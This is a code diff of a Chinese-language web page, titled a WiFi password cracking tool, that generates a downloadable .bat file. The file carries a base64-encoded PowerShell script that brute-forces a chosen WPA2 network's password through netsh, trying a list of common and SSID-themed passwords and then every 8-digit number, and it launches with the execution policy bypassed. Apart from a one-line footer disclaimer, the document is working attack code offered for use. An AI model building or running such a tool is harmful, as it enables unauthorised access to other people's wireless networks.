@@ -6,13 +6,7 @@
     <title>WiFi 密码破解</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 0.2; }
-            50% { opacity: 1; }
-        }
-        .dot-pulse { animation: pulse-dot 1.4s infinite ease-in-out; }
-        .dot-pulse:nth-child(2) { animation-delay: 0.2s; }
-        .dot-pulse:nth-child(3) { animation-delay: 0.4s; }
+        textarea { resize: vertical; }
     </style>
 </head>
 <body class="bg-gray-950 min-h-screen text-gray-100 font-sans antialiased">
@@ -28,94 +22,63 @@
                 </svg>
             </div>
             <h1 class="text-xl font-bold tracking-tight">WiFi 密码破解工具</h1>
-            <p class="text-gray-500 text-sm mt-1">字典穷举 · 自动连接验证</p>
+            <p class="text-gray-500 text-sm mt-1">纯离线 · 下载脚本双击运行 · 无需安装任何东西</p>
         </header>
-
-        <!-- 后端状态提示 -->
-        <div id="backend-status" class="bg-yellow-900/30 border border-yellow-700 rounded-2xl p-4 mb-4 text-center">
-            <p class="text-yellow-300 text-sm font-medium">⚠️ 后端未连接</p>
-            <p class="text-yellow-600 text-xs mt-1">
-                请在电脑上运行 <code class="bg-gray-800 px-1.5 py-0.5 rounded text-yellow-400">python server.py</code><br>
-                默认连接 <code id="backend-url-display" class="text-gray-500">http://localhost:5000</code>
-            </p>
-        </div>
 
         <!-- 输入区 -->
         <section class="bg-gray-900 rounded-2xl p-5 mb-4 border border-gray-800">
             <label class="block text-sm font-medium text-gray-400 mb-2" for="ssid">
                 目标 WiFi 名称 (SSID)
             </label>
-            <input
-                id="ssid"
-                type="text"
-                placeholder="例如: 2lou"
-                value="2lou"
-                autocomplete="off"
+            <input id="ssid" type="text" placeholder="例如: 2lou" value="2lou" autocomplete="off"
                 class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-gray-100
                        placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500
-                       focus:border-transparent transition text-base"
-            />
+                       focus:border-transparent transition text-base" />
         </section>
 
-        <!-- 按钮区 -->
+        <!-- 字典编辑区 -->
+        <section class="bg-gray-900 rounded-2xl p-5 mb-4 border border-gray-800">
+            <div class="flex items-center justify-between mb-2">
+                <label class="text-sm font-medium text-gray-400" for="wordlist">
+                    密码字典
+                </label>
+                <span class="text-xs text-gray-600">每行一个密码</span>
+            </div>
+            <textarea id="wordlist" rows="10"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-100
+                       placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500
+                       focus:border-transparent transition font-mono"
+                placeholder="每行一个密码..."></textarea>
+            <div class="flex items-center justify-between mt-2">
+                <span id="wordlist-count" class="text-xs text-gray-500"></span>
+                <button id="btn-reset" class="text-xs text-blue-500 hover:text-blue-400 transition">
+                    恢复默认字典
+                </button>
+            </div>
+        </section>
+
+        <!-- 说明 -->
+        <section class="bg-blue-900/20 border border-blue-800 rounded-2xl p-4 mb-4">
+            <p class="text-blue-300 text-xs leading-relaxed">
+                <span class="font-medium">💡 使用方式</span><br>
+                填写 SSID → 点击<strong>下载</strong> → 得到 <code>.bat</code> 文件<br>
+                在 Windows 电脑上<strong>双击运行</strong>（会自动调用 PowerShell）<br>
+                顺序：先试常见密码 → 再试全部8位数字（00000000~99999999）→ 全部失败则显示"已尽力了"
+            </p>
+        </section>
+
+        <!-- 按钮 -->
         <section class="flex gap-3 mb-4">
-            <button id="btn-start"
+            <button id="btn-download"
                 class="flex-1 bg-blue-600 hover:bg-blue-500 active:bg-blue-700
                        text-white font-medium py-3.5 px-4 rounded-xl transition-colors
                        disabled:opacity-40 disabled:cursor-not-allowed text-base">
-                ⚡ 开始破解
-            </button>
-            <button id="btn-stop"
-                class="bg-red-600/20 hover:bg-red-600/30 active:bg-red-600/40
-                       text-red-400 font-medium py-3.5 px-5 rounded-xl transition-colors
-                       disabled:opacity-30 disabled:cursor-not-allowed hidden">
-                ⏹ 停止
+                ⬇ 下载破解脚本
             </button>
         </section>
 
-        <!-- 进度区 -->
-        <section id="progress-area" class="bg-gray-900 rounded-2xl p-5 mb-4 border border-gray-800 hidden">
-            <div class="flex items-center justify-between mb-2">
-                <span class="text-sm text-gray-400">破解进度</span>
-                <span id="progress-text" class="text-sm text-blue-400 font-mono">0 / 0</span>
-            </div>
-            <div class="w-full bg-gray-800 rounded-full h-2.5 overflow-hidden">
-                <div id="progress-bar"
-                     class="bg-gradient-to-r from-blue-500 to-blue-400 h-full rounded-full
-                            transition-all duration-300 ease-out"
-                     style="width: 0%"></div>
-            </div>
-            <p id="current-try" class="text-xs text-gray-500 mt-2 truncate"></p>
-        </section>
+        <p id="estimate" class="text-center text-xs text-gray-600"></p>
 
-        <!-- 结果区 -->
-        <section id="result-area" class="hidden mb-4">
-            <div id="result-success" class="hidden bg-emerald-900/40 border border-emerald-700 rounded-2xl p-5 text-center">
-                <div class="text-3xl mb-2">🎉</div>
-                <p class="text-emerald-300 text-sm mb-1">密码已找到</p>
-                <p id="result-password" class="text-2xl font-bold text-emerald-200 font-mono tracking-wider"></p>
-            </div>
-            <div id="result-fail" class="hidden bg-gray-800 border border-gray-700 rounded-2xl p-5 text-center">
-                <div class="text-3xl mb-2">😞</div>
-                <p class="text-gray-400 text-sm">未找到匹配的密码</p>
-                <p class="text-gray-500 text-xs mt-1">请尝试更大的字典文件</p>
-            </div>
-        </section>
-
-        <!-- 日志区 -->
-        <section class="bg-gray-900 rounded-2xl border border-gray-800 overflow-hidden">
-            <div class="flex items-center justify-between px-5 py-3 border-b border-gray-800">
-                <span class="text-sm font-medium text-gray-400">运行日志</span>
-                <span id="log-count" class="text-xs text-gray-600">0 条</span>
-            </div>
-            <div id="log-container"
-                 class="h-56 overflow-y-auto p-4 space-y-1.5 font-mono text-xs"
-                 style="-webkit-overflow-scrolling: touch;">
-                <p class="text-gray-700 text-center py-8">等待开始...</p>
-            </div>
-        </section>
-
-        <!-- 免责声明 -->
         <footer class="text-center text-xs text-gray-700 mt-6 leading-relaxed px-2">
             ⚠️ 本工具仅供安全研究和授权测试使用<br>
             请勿用于非法破解他人 WiFi 网络
@@ -123,143 +86,302 @@
     </main>
 
     <script>
-        // ─── 配置：后端地址（可修改为局域网地址） ──────────────
-        const API_BASE = window.API_BASE || "http://localhost:5000";
+        // ─── 常见密码（按概率排序） ──────────────────────────
+        const COMMON = [
+            "12345678", "88888888", "00000000", "11111111", "22222222",
+            "33333333", "44444444", "55555555", "66666666", "77777777",
+            "99999999", "123456789", "1234567890", "87654321", "11223344",
+            "12341234", "12344321", "12121212", "13131313", "01010101",
+            "10101010", "123123123", "111222333",
+            "password", "password1", "password123",
+            "admin123", "admin888", "admin666", "admin168",
+            "qwertyuiop", "qwerty123", "qweasdzxc", "asdfghjkl",
+            "abc12345", "abcd1234", "a1234567", "a12345678",
+            "Aa123456", "@1234567", "1q2w3e4r", "1q2w3e4r5t",
+            "iloveyou", "welcome1", "hello123", "trustno1",
+            "mima123456", "mima8888", "wifi1234", "wifi8888",
+            "wifi6666", "wifi9999", "123456wifi",
+            "luyou8888", "zhongguo123", "xiao123456", "woaini1314",
+            "admin", "tplink", "tplink123", "root123", "guest123",
+            "20202020", "20212021", "20222022", "20232023", "20242024",
+            "20252025", "20080808", "20101010", "5201314", "1314520",
+            "2lou1234", "2lou8888", "2lou2024", "2lou2025", "2lou2026",
+            "2lou888", "2lou666", "2lou168", "2lou520",
+            "lou12345", "erluo888", "erluo123", "erlou888",
+            "2lou2lou", "lou123456",
+            "88886666", "16888888", "66668888", "66888888",
+            "14725836", "25836914", "15935746",
+            "12369874", "14789632", "15975328",
+            "11112222", "22221111", "11221122",
+            "00001111", "11110000",
+            "168168", "518518", "666888", "888666", "520520",
+            "13800138000", "13900139000", "13700137000",
+            "13600136000", "13500135000", "15800158000",
+            "18888888888", "16666666666", "19999999999",
+            "13333333333", "15555555555", "17777777777",
+        ];
 
-        const $ = (sel) => document.querySelector(sel);
+        const $ = s => document.querySelector(s);
+        const ssidInput  = $("#ssid");
+        const wordlistEl = $("#wordlist");
+        const countEl    = $("#wordlist-count");
+        const btnReset   = $("#btn-reset");
+        const btnDownload = $("#btn-download");
+        const estimateEl = $("#estimate");
 
-        const btnStart    = $("#btn-start");
-        const btnStop     = $("#btn-stop");
-        const ssidInput   = $("#ssid");
-        const backendStatus = $("#backend-status");
-        const backendUrlDisplay = $("#backend-url-display");
-        const progressArea = $("#progress-area");
-        const progressBar  = $("#progress-bar");
-        const progressText = $("#progress-text");
-        const currentTry   = $("#current-try");
-        const resultArea   = $("#result-area");
-        const resultSuccess = $("#result-success");
-        const resultFail    = $("#result-fail");
-        const resultPassword = $("#result-password");
-        const logContainer  = $("#log-container");
-        const logCount      = $("#log-count");
+        function loadDefault() {
+            wordlistEl.value = COMMON.join("\n");
+            updateCount();
+        }
+        function updateCount() {
+            const lines = wordlistEl.value.split("\n").filter(l => l.trim());
+            const n = lines.length;
+            const phase2 = 100000000;
+            const minTotal = (n + phase2) * 5;
+            const minH = Math.floor(minTotal / 3600);
+            const minD = Math.floor(minH / 24);
+            countEl.textContent = `阶段1: ${n} 条常见密码 → 阶段2: ${phase2.toLocaleString()} 条全8位数字`;
+            const phase1Min = Math.ceil(n * 5 / 60);
+            if (minD > 0) {
+                estimateEl.textContent = `阶段1 约需 ${phase1Min} 分钟 | 全部跑完约需 ${minD.toLocaleString()} 天（8位数字全组合共1亿条）`;
+            } else {
+                estimateEl.textContent = `阶段1 约需 ${phase1Min} 分钟 | 阶段2 全8位数字约需 ${Math.ceil(minH)} 小时`;
+            }
+        }
+        btnReset.addEventListener("click", loadDefault);
+        wordlistEl.addEventListener("input", updateCount);
 
-        // 显示后端地址
-        backendUrlDisplay.textContent = API_BASE;
+        // ─── 生成脚本 ────────────────────────────────────────
+        function build(ssid, phase1Passwords) {
+            // 阶段1密码（去重、>=8位）
+            const p1 = [...new Set(phase1Passwords.map(p => p.trim()).filter(p => p.length >= 8))];
 
-        let eventSource = null;
-        let logLines = 0;
+            // ── PowerShell 破解引擎 ──
+            const psScript = `#Requires -Version 5.1
+<#
+.WiFi 密码破解脚本
+ 阶段1: 常见密码
+ 阶段2: 全部8位数字组合 (00000000 ~ 99999999)
+#>
 
-        // ─── 后端连通性检查 ──────────────────────────────────
-        async function checkBackend() {
-            try {
-                const resp = await fetch(`${API_BASE}/api/state`, { signal: AbortSignal.timeout(2000) });
-                if (resp.ok) {
-                    backendStatus.classList.add("hidden");
-                    return true;
-                }
-            } catch (e) {}
-            backendStatus.classList.remove("hidden");
-            return false;
+param([string]$ssid = 'SSID')
+
+$ErrorActionPreference = 'SilentlyContinue'
+$host.UI.RawUI.WindowTitle = "WiFi Crack - $ssid"
+
+# ── 阶段1密码（由网页生成时嵌入） ──
+$phase1 = @(
+${p1.map(p => `    '${p.replace(/'/g, "''")}'`).join(",\n")}
+)
+
+# ── 辅助函数 ──
+function Test-Connection {
+    param($targetSSID)
+    $out = netsh wlan show interfaces 2>$null
+    $lines = $out -split "\`n"
+    foreach ($line in $lines) {
+        if ($line -match 'SSID\\s*:\\s*(.+)$') {
+            if ($Matches[1].Trim() -eq $targetSSID) { return $true }
+        }
+    }
+    return $false
+}
+
+function Try-Password {
+    param($targetSSID, $password)
+    netsh wlan delete profile name="$targetSSID" 2>$null | Out-Null
+
+    $xml = @"
+<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>$targetSSID</name>
+    <SSIDConfig><SSID><name>$targetSSID</name></SSID></SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>manual</connectionMode>
+    <MSM><security><authEncryption>
+        <authentication>WPA2PSK</authentication>
+        <encryption>AES</encryption>
+        <useOneX>false</useOneX>
+    </authEncryption>
+    <sharedKey><keyType>passPhrase</keyType>
+        <protected>false</protected>
+        <keyMaterial>$password</keyMaterial>
+    </sharedKey></security></MSM>
+</WLANProfile>
+"@
+    $xmlPath = Join-Path $env:TEMP "wifi_crack_temp.xml"
+    $xml | Out-File -FilePath $xmlPath -Encoding UTF8 -Force
+    netsh wlan add profile filename="$xmlPath" 2>$null | Out-Null
+    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 500
+    netsh wlan connect name="$targetSSID" 2>$null | Out-Null
+    Start-Sleep -Seconds 4
+    return (Test-Connection $targetSSID)
+}
+
+# ── 主流程 ──
+Write-Host ""
+Write-Host "============================================" -ForegroundColor Cyan
+Write-Host "  WiFi 密码破解脚本" -ForegroundColor Cyan
+Write-Host "  目标: $ssid" -ForegroundColor Cyan
+Write-Host "  阶段1: $($phase1.Count) 条常见密码" -ForegroundColor Cyan
+Write-Host "  阶段2: 全部8位数字 (00000000~99999999)" -ForegroundColor Cyan
+Write-Host "============================================" -ForegroundColor Cyan
+Write-Host ""
+
+# 断开当前连接
+Write-Host "[*] 断开当前 WiFi..." -ForegroundColor Gray
+netsh wlan disconnect 2>$null | Out-Null
+Start-Sleep -Seconds 2
+
+$found = $false
+$sw = [System.Diagnostics.Stopwatch]::StartNew()
+
+# ═══════════════════════════════════════════════
+#  阶段1: 常见密码
+# ═══════════════════════════════════════════════
+Write-Host "=== 阶段1: 常见密码 ($($phase1.Count) 条) ==="
+Write-Host ""
+
+for ($i = 0; $i -lt $phase1.Count; $i++) {
+    $pwd = $phase1[$i]
+    $n = $i + 1
+    Write-Host ("[$n/$($phase1.Count)] 尝试: $pwd") -ForegroundColor Yellow
+    if (Try-Password $ssid $pwd) {
+        Write-Host ""
+        Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Green
+        Write-Host "║  PASSWORD FOUND !!!                      ║" -ForegroundColor Green
+        Write-Host ("║  SSID     : $ssid") -ForegroundColor Green
+        Write-Host ("║  Password : $pwd") -ForegroundColor Green
+        Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Green
+        Write-Host ""
+        $sw.Stop()
+        $min = [math]::Round($sw.Elapsed.TotalMinutes, 1)
+        Write-Host ("耗时: $min 分钟") -ForegroundColor Gray
+        Read-Host "按 Enter 退出"
+        exit 0
+    }
+}
+
+Write-Host ""
+Write-Host "[阶段1 完成] $($phase1.Count) 条常见密码均未成功" -ForegroundColor Gray
+$min1 = [math]::Round($sw.Elapsed.TotalMinutes, 1)
+Write-Host ("阶段1耗时: $min1 分钟") -ForegroundColor Gray
+Write-Host ""
+
+# 构建阶段1的8位数字跳过集合
+$skipSet = New-Object 'System.Collections.Generic.HashSet[string]'
+foreach ($p in $phase1) { if ($p -match '^\\d{8}$') { [void]$skipSet.Add($p) } }
+
+# ═══════════════════════════════════════════════
+#  阶段2: 全部8位数字组合 (00000000 ~ 99999999)
+# ═══════════════════════════════════════════════
+Write-Host "=== 阶段2: 全部8位数字组合 (00000000~99999999) ==="
+Write-Host ""
+
+$total = 100000000
+$lastReport = 0
+
+for ($i = 0; $i -le 99999999; $i++) {
+    $pwd = $i.ToString("00000000")
+
+    # 跳过阶段1已尝试的8位数字
+    if ($skipSet.Contains($pwd)) { continue }
+
+    # 每10000条报告进度
+    if ($i - $lastReport -ge 10000) {
+        $pct = [math]::Round($i / 99999999 * 100, 4)
+        $elapsed = [math]::Round($sw.Elapsed.TotalMinutes, 1)
+        $rate = if ($elapsed -gt 0) { [math]::Round(($i + 1) / ($elapsed * 60), 0) } else { 0 }
+        Write-Host ("[阶段2] $i / 100000000 ($pct%)  ~$rate pwd/s  当前: $pwd") -ForegroundColor DarkYellow
+        $lastReport = $i
+    }
+
+    if (Try-Password $ssid $pwd) {
+        Write-Host ""
+        Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Green
+        Write-Host "║  PASSWORD FOUND !!!                      ║" -ForegroundColor Green
+        Write-Host ("║  SSID     : $ssid") -ForegroundColor Green
+        Write-Host ("║  Password : $pwd") -ForegroundColor Green
+        Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Green
+        Write-Host ""
+        $sw.Stop()
+        $totalMin = [math]::Round($sw.Elapsed.TotalMinutes, 1)
+        Write-Host ("总耗时: $totalMin 分钟") -ForegroundColor Gray
+        Read-Host "按 Enter 退出"
+        exit 0
+    }
+}
+
+# ── 全部失败 ──
+$sw.Stop()
+$totalMin = [math]::Round($sw.Elapsed.TotalMinutes, 1)
+Write-Host ""
+Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Red
+Write-Host "║  DONE - NO PASSWORD FOUND               ║" -ForegroundColor Red
+Write-Host "║  已尽力了，未找到匹配的密码               ║" -ForegroundColor Red
+Write-Host ("║  阶段1: $($phase1.Count) 条 + 阶段2: 全部8位数字") -ForegroundColor Red
+Write-Host ("║  总耗时: $totalMin 分钟") -ForegroundColor Red
+Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Red
+Write-Host ""
+Read-Host "按 Enter 退出"
+exit 1
+`;
+
+            // Base64 编码
+            const b64 = btoa(unescape(encodeURIComponent(psScript)));
+
+            // ── .bat 启动器 ──
+            // 把 base64 嵌入 .bat 末尾作为数据块，PowerShell 自己从 .bat 文件中提取并解码
+            // 避免了命令行长度限制和转义地狱
+            const bat = `@echo off
+chcp 65001 >nul 2>&1
+title WiFi Crack - ${ssid.replace(/[&|<>^%!"]/g, "")}
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$bat = Get-Content '%~f0' -Raw; ^
+$start = $bat.IndexOf('<#B64#>') + 7; ^
+$end = $bat.IndexOf('<#END#>'); ^
+$b64 = $bat.Substring($start, $end-$start).Trim(); ^
+$ps = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); ^
+$ps = $ps.Replace('__SSID__','${ssid.replace(/'/g, "''")}'); ^
+$psFile = Join-Path $env:TEMP 'wifi_crack.ps1'; ^
+[System.IO.File]::WriteAllText($psFile, $ps); ^
+& $psFile; ^
+Remove-Item $psFile -Force"
+pause
+exit /b
+
+<#B64#>
+${b64}
+<#END#>
+`;
+
+            return bat;
         }
 
-        // 启动时检查一次
-        checkBackend();
-        setInterval(checkBackend, 5000);
+        function escapeBat(s) { return s.replace(/[&|<>^%!"]/g, ""); }
+        function escapePS(s) { return s.replace(/'/g, "''").replace(/`/g, "'`'"); }
 
-        function setRunning(running) {
-            btnStart.disabled = running;
-            btnStart.classList.toggle("hidden", running);
-            btnStop.classList.toggle("hidden", !running);
-            ssidInput.disabled = running;
-        }
-
-        function addLog(msg) {
-            logLines++;
-            logCount.textContent = `${logLines} 条`;
-            const p = document.createElement("p");
-            p.className = "text-gray-400";
-            p.textContent = msg;
-            logContainer.appendChild(p);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-
-        btnStart.addEventListener("click", async () => {
+        // ─── 下载 ────────────────────────────────────────────
+        btnDownload.addEventListener("click", () => {
             const ssid = ssidInput.value.trim();
             if (!ssid) { alert("请输入 WiFi 名称"); return; }
+            const passwords = wordlistEl.value.split("\n").filter(l => l.trim());
+            if (!passwords.length) { alert("请填写至少一个密码"); return; }
 
-            // 检查后端
-            const ok = await checkBackend();
-            if (!ok) {
-                addLog("❌ 后端未连接！请先在电脑上运行 python server.py");
-                return;
-            }
-
-            logContainer.innerHTML = "";
-            logLines = 0;
-            logCount.textContent = "0 条";
-            progressArea.classList.remove("hidden");
-            progressBar.style.width = "0%";
-            progressText.textContent = "0 / 0";
-            currentTry.textContent = "";
-            resultArea.classList.add("hidden");
-            resultSuccess.classList.add("hidden");
-            resultFail.classList.add("hidden");
-
-            setRunning(true);
-            addLog(`目标 WiFi: ${ssid}`);
-
-            try {
-                const resp = await fetch(`${API_BASE}/api/start`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ ssid }),
-                });
-                const data = await resp.json();
-                if (data.error) { addLog(`❌ ${data.error}`); setRunning(false); return; }
-                addLog("破解已启动...");
-            } catch (err) {
-                addLog(`❌ 无法连接后端: ${err.message}`);
-                setRunning(false);
-                return;
-            }
-
-            if (eventSource) eventSource.close();
-            eventSource = new EventSource(`${API_BASE}/api/stream`);
-
-            eventSource.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                if (data.type === "log") addLog(`[${data.time}] ${data.msg}`);
-                if (data.type === "progress") {
-                    const pct = data.total > 0 ? Math.round(data.tried / data.total * 100) : 0;
-                    progressBar.style.width = `${pct}%`;
-                    progressText.textContent = `${data.tried} / ${data.total}`;
-                    if (data.current) currentTry.textContent = `当前尝试: ${data.current}`;
-                }
-                if (data.type === "result") {
-                    resultArea.classList.remove("hidden");
-                    if (data.found) { resultSuccess.classList.remove("hidden"); resultPassword.textContent = data.password; }
-                    else { resultFail.classList.remove("hidden"); }
-                }
-                if (data.type === "done" || data.type === "idle") {
-                    setRunning(false);
-                    if (eventSource) { eventSource.close(); eventSource = null; }
-                }
-            };
-
-            eventSource.onerror = () => {
-                if (eventSource) { eventSource.close(); eventSource = null; }
-                setRunning(false);
-                addLog("⚠️ 后端连接断开");
-            };
+            const batContent = build(ssid, passwords);
+            const blob = new Blob([batContent], { type: "application/octet-stream" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = `crack_${ssid}.bat`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
         });
 
-        btnStop.addEventListener("click", async () => {
-            addLog("正在停止...");
-            try { await fetch(`${API_BASE}/api/stop`, { method: "POST" }); } catch (e) {}
-            setRunning(false);
-            if (eventSource) { eventSource.close(); eventSource = null; }
-        });
+        loadDefault();
     </script>
 </body>
 </html>
